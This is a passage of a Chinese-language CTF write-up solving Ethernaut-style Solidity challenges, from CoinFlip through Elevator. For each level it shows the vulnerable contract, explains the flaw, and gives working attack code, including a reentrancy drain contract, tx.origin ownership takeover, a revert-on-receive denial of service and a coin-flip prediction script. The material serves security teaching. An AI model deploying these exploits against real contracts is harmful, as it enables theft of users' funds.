uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目需要我们连续猜中10次，可以考虑用python直接交互，或者使用合约去调用合约。</p>
<p>题目中的<code>block.number</code>返回的是当前正在打包的区块的编号，这是一个固定值。因此在自己的合约中无论如何都只能猜中一次。需要手动调用攻击合约10次。在使用pyhton时应当注意<code>web3.eth.get_block_number()</code>返回的是当前已上链的区块数，因此预先计算时无需额外减1。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line">lastHash = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">blockValue = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetResult</span>():</span><br><span class="line">    <span class="keyword">global</span> lastHash, blockValue, FACTOR</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        blockValue = web3.eth.get_block(web3.eth.get_block_number()).<span class="built_in">hash</span></span><br><span class="line">        <span class="keyword">if</span> blockValue == lastHash:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(blockValue)</span><br><span class="line">        lastHash = blockValue</span><br><span class="line">        coinFlip = bytes_to_long(blockValue) // FACTOR</span><br><span class="line">        <span class="keyword">return</span> coinFlip == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">contract = GetContract()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    result = GetResult()</span><br><span class="line">    PayableCall(<span class="string">&#x27;flip&#x27;</span>, [result], <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(ViewCall(<span class="string">&#x27;consecutiveWins&#x27;</span>, []))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface CoinFlip</span><br><span class="line">&#123;</span><br><span class="line">    function flip(bool _guess) external returns (bool) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack</span><br><span class="line">&#123;</span><br><span class="line">    uint256 BlockValue = 0;</span><br><span class="line">    uint256 Flip = 0;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function send_msg() public</span><br><span class="line">    &#123;</span><br><span class="line">        BlockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        Flip = BlockValue / FACTOR;</span><br><span class="line">        </span><br><span class="line">        CoinFlip target = CoinFlip(0x25c35bd3aD549A4A5eCB941c3A07D2cF6D1B9102);</span><br><span class="line">        target.flip(Flip == 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level4-telephone">level4 Telephone</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _owner) public &#123;</span><br><span class="line">        if (tx.origin != msg.sender) &#123;</span><br><span class="line">            owner = _owner;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设有以下调用链：<code>account -&gt; contract A -&gt; ontract B</code>，对于合约B来说<code>msg.sender = contract A</code>，<code>tx.origin = account</code>。因此，我们使用合约去调用题目合约即可使得<code>tx.origin != msg.sender</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone</span><br><span class="line">&#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack</span><br><span class="line">&#123;</span><br><span class="line">    function attack() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        Telephone t = Telephone(0xa337B36207C062F1fF9184020eCd13568a28066B);</span><br><span class="line">        t.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level5-token">level5 Token</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">    mapping(address =&gt; uint256) balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;</span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">        balances[msg.sender] -= _value;</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_owner];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>balances[msg.sender]</code>和<code>_value</code>都是<code>uint256</code>类型，他们作差将永远不会小于0。令<code>_value = 21</code>使其下溢。实践中应当使用<code>SafeMath</code>库或者如下类似代码防止溢出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(a + c &gt; a) &#123;</span><br><span class="line">  a = a + c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level6-delegation">level6 Delegation</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    constructor(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>合约间调用总计三种方式，假设有调用链：<code>account A -&gt; contract B -&gt; contract C</code>，其特点如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center"></th>
<th style="text-align:center">msg值</th>
<th style="text-align:center">运行环境</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">call</td>
<td style="text-align:center"><code>A -&gt; B</code></td>
<td style="text-align:center"><code>C</code></td>
</tr>
<tr>
<td style="text-align:center">callcode</td>
<td style="text-align:center"><code>A -&gt; B</code></td>
<td style="text-align:center"><code>B</code></td>
</tr>
<tr>
<td style="text-align:center">delegatecall</td>
<td style="text-align:center"><code>A</code></td>
<td style="text-align:center"><code>B</code></td>
</tr>
</tbody>
</table>
<p><code>msg.data</code>中存储了交易发生时的函数调用请求。我们可以尝试对<code>Delegation</code>合约调用<code>pwn</code>函数，由于<code>Delegation</code>合约找不到对应的函数，就会执行<code>fallback</code>函数。此时<code>msg.data</code>中存储着对<code>pwn</code>函数的调用请求，经过<code>delegatecall</code>后，会在<code>Delegation</code>合约的环境下执行<code>Delegate</code>合约的<code>pwn</code>函，也就修改了<code>Delegation</code>合约中的<code>owner</code>。</p>
<h2 id="level7-force">level7 Force</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123; /*</span><br><span class="line">                     MEOW ?</span><br><span class="line">           /\_/\   /</span><br><span class="line">      ____/ o o \</span><br><span class="line">     /~____  =ø= /</span><br><span class="line">    (______)__m_m)</span><br><span class="line">                   */ </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目并没有函数可以接受转账。然而，每个合约在被销毁时都可以指定一个地址，将余额全部转过去。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack</span><br><span class="line">&#123;</span><br><span class="line">    function destruct(address payable addr) public payable</span><br><span class="line">    &#123;</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们是无法阻止其他人向合约转账的。</p>
<h2 id="level8-vault">level8 Vault</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目将<code>password</code>设置成了<code>private</code>，其他合约并不能访问它。但是，合约中的变量依旧存储在链上，我们可以使用<code>web3.eth.get_storage_at(ContractAddress, Index)</code>直接访问对应的地址来获取其值。</p>
<p>以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>256</mn></msup></mrow><annotation encoding="application/x-tex">2^{256}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></span>的超级数组中，数组中每个元素称为插槽(<code>slot</code>)，其初始值为 0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零 (空值) 数据才会被真正写入存储。每个数据存储的插槽位置是一定的。</p>
<p>假设有如下合约：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address a;      // 0</span><br><span class="line">    uint8 b;        // 0</span><br><span class="line">    uint256 c;      // 1</span><br><span class="line">    bytes24 d;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么它的存储布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       c (32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>对于这道题，我们可以访问<code>slot[1]</code>来获取密码的值。</p>
<p>区块链上没有秘密。</p>
<h2 id="level9-king">level9 King</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>合约转账总计有三种方法：</p>
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">返回值</th>
<th style="text-align:center">失败处理</th>
<th style="text-align:center">限制</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>addr.transfer(value)</code></td>
<td style="text-align:center">无</td>
<td style="text-align:center">回退</td>
<td style="text-align:center"><code>gas</code>小于2300</td>
</tr>
<tr>
<td style="text-align:center"><code>addr.call&#123;value : value&#125;('')</code></td>
<td style="text-align:center"><code>(bool, bytes memory)</code></td>
<td style="text-align:center">返回false</td>
<td style="text-align:center">无</td>
</tr>
<tr>
<td style="text-align:center"><code>addr.send(value)</code></td>
<td style="text-align:center"><code>bool</code></td>
<td style="text-align:center">返回false</td>
<td style="text-align:center"><code>gas</code>小于2300</td>
</tr>
</tbody>
</table>
<p>如此一来，我们只需让合约无法给我们转账即可。构建如下合约给题目合约打钱即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack</span><br><span class="line">&#123;</span><br><span class="line">    constructor() payable</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable</span><br><span class="line">    &#123;</span><br><span class="line">        bool b;</span><br><span class="line">        bytes memory data;</span><br><span class="line">        address addr = 0x3EF73E588BAd849df7Cd7e5783925314ECA069B3;</span><br><span class="line">        (b, data) = addr.call&#123;value : address(this).balance&#125;(&#x27;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable</span><br><span class="line">    &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level10-re-entrancy">level10 Re-entrancy</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目先转账、再修改记录的行为构成了最经典的重入攻击。当合约的转账对象为一个合约，且它在<code>receive()</code>函数中重新调用这个转账函数，那么将会导致资金被无提取。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Reentrance &#123;</span><br><span class="line">    function withdraw(uint256 _amount) external;</span><br><span class="line">    function donate(address _to) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    uint256 times = 2;</span><br><span class="line">    address addr = 0x5323272050f2484eF6490A22E2401C367c3c89a6;</span><br><span class="line">    Reentrance reentrance = Reentrance(addr);</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        reentrance.donate&#123;value : 0.001 ether&#125;(address(this));</span><br><span class="line">        reentrance.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if(times &gt; 0) &#123;</span><br><span class="line">            reentrance.withdraw(0.001 ether);</span><br><span class="line">            times--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level11-elevator">level11 Elevator</h2>
<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目天真地认为同样的函数同样的参数会得到同样的结果。我们可以构造如下合约使得两次调用返回不同的结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">    function goTo(uint256 _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    bool t;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        Elevator e = Elevator(0x9AEe08f2C5de55C080d6A42CF584Cbad96ACe003);</span><br><span class="line">        e.goTo(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint256 f) external returns (bool) &#123;</span><br><span class="line">        t = !t;</span><br><span class="line">        return !t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="level12-privacy">level12 Privacy</h2>
<p>题目：</p>
